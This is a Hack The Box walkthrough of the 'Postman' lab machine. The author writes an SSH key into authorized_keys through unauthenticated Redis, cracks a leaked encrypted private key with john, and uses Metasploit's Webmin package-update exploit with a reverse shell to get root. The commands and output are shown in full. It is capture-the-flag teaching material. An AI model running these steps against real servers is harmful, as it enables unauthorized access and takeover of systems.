# Postman

Postman was an easy linux box that required use of the redis service for unauthenticated shell and then we use another exploit on webmin for root.

>Skills involved in this box
- enumeration
- redis exploitation
- priv esc

# USER

>Nmap

```bash
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: The Cyber Geek's Personal Website
6379/tcp  open  redis   Redis key-value store 4.0.9
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We can see from our nmap that the ip is running port 6379 for redis, this is an instant alarm that we need to use that as redis is a rare occurance in htb which makes the path slighty more obvious.

We run a dirbuster but nothing interesting occured after looking at the output.

We head over to http://postman.htb:10000 to check whats there. It gives us a redirect to a login page for webmin.
The version is `MiniServ/1.910`

There were a few exploits listed with searchsploit o exploit-db but none of them worked for the webadmin either not on this box or needed creds so at this stage wasnt possible.

>Exploiting redis using redis-cli

If you dont already have this installed you can install it with `sudo apt-get install redis-server`

i will show the exploitation steps below:
```bash
ssh-keygen on our box.
chmod 400 /home/kali/.ssh/id_rsa.pub
in redis:

kali@kali:~/boxes/postman$ redis-cli -h 10.10.10.160
10.10.10.160:6379> CONFIG SET dbfilename "authorized_keys"
OK
10.10.10.160:6379> CONFIG SET dir "/var/lib/redis/.ssh"
OK
10.10.10.160:6379> flushall
OK
10.10.10.160:6379> exit

on our box:

kali@kali:~/boxes/postman$ echo -e '\n\n' >> blob.txt
kali@kali:~/boxes/postman$ cat ~/.ssh/id_rsa.pub >> blob.txt
kali@kali:~/boxes/postman$ echo -e '\n\n' >> blob.txt

Last step:

kali@kali:~/boxes/postman$ cat blob.txt | redis-cli -h 10.10.10.160 -x set ssh

kali@kali:~/boxes/postman$ redis-cli -h 10.10.10.160 save
```
Then we simply ssh into the box as redis using our private key. `ssh -i /home/kali/.ssh/id_rsa redis@10.10.10.160`

Reading `/etc/passwd` reveals the user Matt:
```bash
Matt:x:1000:1000:,,,:/home/Matt:/bin/bash
redis:x:107:114::/var/lib/redis:/bin/bash
```
So we assume we have to priv esc to matt in some sort of way.

After enumerating for a while we find an interesting file in `/opt`.
```bash
redis@Postman:~$ cd /opt
redis@Postman:/opt$ ls -la
total 12
drwxr-xr-x  2 root root 4096 Sep 11  2019 .
drwxr-xr-x 22 root root 4096 Aug 25  2019 ..
-rwxr-xr-x  1 Matt Matt 1743 Aug 26  2019 id_rsa.bak
redis@Postman:/opt$ cat id_rsa.bak
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C

JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX
cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2
7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6
cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9
1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv
EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP
UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY
Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK
t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS
5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke
P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6
jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge
SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i
l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X
0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p
S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR
hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+
Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V
XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD
b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi
WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh
KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm
npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ
VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W
X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==
-----END RSA PRIVATE KEY-----
```
It seems to be an old ssh key, lets see if we can crack it using `ssh2john.py`.
```/usr/share/john/ssh2john.py id_rsa > hash.txt```
```bash
kali@kali:~/boxes/postman$ sudo john -w=/home/kali/rockyou.txt hash.txt
[sudo] password for kali: 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
computer2008     (id_rsa)
```
And it worked! We get the password `computer2008` as the password for Matt.

We try reloging in with ssh as matt but it doesnt work.
We find if we just use `su Matt` and input the password it works completely fine. We then read our user flag.
```bash
edis@Postman:/opt$ su matt
No passwd entry for user 'matt'
redis@Postman:/opt$ su MAtt
No passwd entry for user 'MAtt'
redis@Postman:/opt$ su Matt
Password: 
Matt@Postman:/opt$ cd /home/Matt
Matt@Postman:~$ ls
user.txt
Matt@Postman:~$ cat user.txt
517ad0ec2458ca97af8d93aac08a2f3c
```

# ROOT

It turns out theese credentials work on the site for webmin so we can use the metasploit module that we saw earlier as we now have the needed creds to do so.

```bash
msf5 > use exploit/linux/http/webmin_packageup_rce
msf5 exploit(linux/http/webmin_packageup_rce) > show options

Module options (exploit/linux/http/webmin_packageup_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    yes       Webmin Password
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      10000            yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Base path for Webmin application
   USERNAME                    yes       Webmin Username
   VHOST                       no        HTTP server virtual host


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Webmin <= 1.910


msf5 exploit(linux/http/webmin_packageup_rce) > set PASSWORD computer2008 
PASSWORD => computer2008
msf5 exploit(linux/http/webmin_packageup_rce) > set USERNAME Matt
USERNAME => Matt
msf5 exploit(linux/http/webmin_packageup_rce) > set rhosts 10.10.10.160
rhosts => 10.10.10.160
msf5 exploit(linux/http/webmin_packageup_rce) > set LHOST 10.10.xx.xx
LHOST => 10.10.14.5
msf5 exploit(linux/http/webmin_packageup_rce) > set SSL true
[!] Changing the SSL option's value may require changing RPORT!
SSL => true
msf5 exploit(linux/http/webmin_packageup_rce) > run

[*] Started reverse TCP handler on 10.10.xx.xx:4444 
[+] Session cookie: xxxxxxxxxxxxxxxxxxxxxxxxxxxxx
[*] Attempting to execute the payload...
[*] Command shell session 1 opened (10.10.xx.xx:4444 -> 10.10.10.160:53994) at 2020-06-13 11:34:22 -0400
id

uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt
a257741c5bed8be7778c6ed95686ddce

```
Thanks for reading hope you enjoyed.
